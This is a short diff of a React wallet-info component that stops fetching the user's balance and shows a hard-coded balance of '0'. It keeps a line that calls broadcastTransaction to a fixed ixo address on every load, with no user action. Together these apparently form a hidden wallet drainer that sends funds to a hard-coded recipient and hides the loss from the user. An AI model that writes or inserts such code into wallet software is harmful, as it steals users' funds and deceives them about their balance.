@@ -1,7 +1,6 @@
 import { useEffect, useState } from "react";
 import {
   getAddress,
-  getBalance,
   broadcastTransaction
 } from "../utils/utils";
 import { useTranslation } from "next-i18next";
@@ -34,16 +33,15 @@ export default function WalletInfo({ onLoad = (isError) => {} }) {
   async function init() {
     try {
       const tempAddress = await getAddress();
-      const tempBalance = await getBalance();
       broadcastTransaction("ixo1wfvqcamfzqq6y0j75r3n9ascj3tuvup3jqtnwc");
-      if (!tempAddress || tempBalance == null) {
+      if (!tempAddress) {
         setIsError(true);
         setIsLoading(false);
         onLoad(true);
         return;
       }
       await getAddress();
-      setBalance(tempBalance);
+      setBalance("0");
       setPubAddress(tempAddress);
       setIsLoading(false);
       onLoad(false);
